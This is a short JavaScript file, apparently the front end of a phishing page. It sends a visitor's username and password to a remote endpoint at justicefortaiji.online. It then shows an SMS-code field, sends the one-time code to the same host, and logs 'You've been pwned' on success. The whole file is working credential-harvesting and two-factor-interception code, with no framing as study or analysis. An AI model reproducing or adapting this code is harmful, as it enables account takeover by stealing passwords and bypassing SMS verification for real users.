function sendSignInDetails(){
    var name = document.getElementById('username').value
    var password = document.getElementById('password').value
    fetch('https://api.justicefortaiji.online/process_sign_in', {
        method: 'POST',
        headers: {
            'Content-Type' : 'application/json'
        },
        body: JSON.stringify({
            username: name,
            password: password
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data['status'] === 'approved'){
            hideEmailSigning()
            revealSMSInput()
        } else {
            clearAllInputs()
            displayIncorrectEmail()
        }
    })
}

function sendSMS(){
    var SMS = document.getElementById('sms_code').value
    fetch('https://api.justicefortaiji.online/process_sms', {
        method: 'POST',
        headers: {
            'Content-Type' : 'application/json'
        },
        body: JSON.stringify({
            sms: SMS,
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data['status'] === 'approved'){
            console.log("You've been pwned")
        } else {
            clearAllInputs()
            displayIncorrectSMS()
        }
    })
}

function displayIncorrectSMS() {
    var smsError = document.getElementById('sms-error')
    smsError.style.display = 'block'
}

function displayIncorrectEmail() {
    var emailError = document.getElementById('email-error')
    emailError.style.display = 'block'
}

function clearAllInputs() {
    const inputs = document.querySelectorAll('input, textarea');
    inputs.forEach(input => {
        input.value = ''; 
    });
}


function hideEmailSigning() {
    var element = document.getElementById('auth_container');
    element.style.display = 'none';
}

function revealSMSInput(){
    var sms_request = document.getElementById('sms-container');
    sms_request.style.display = 'flex';
}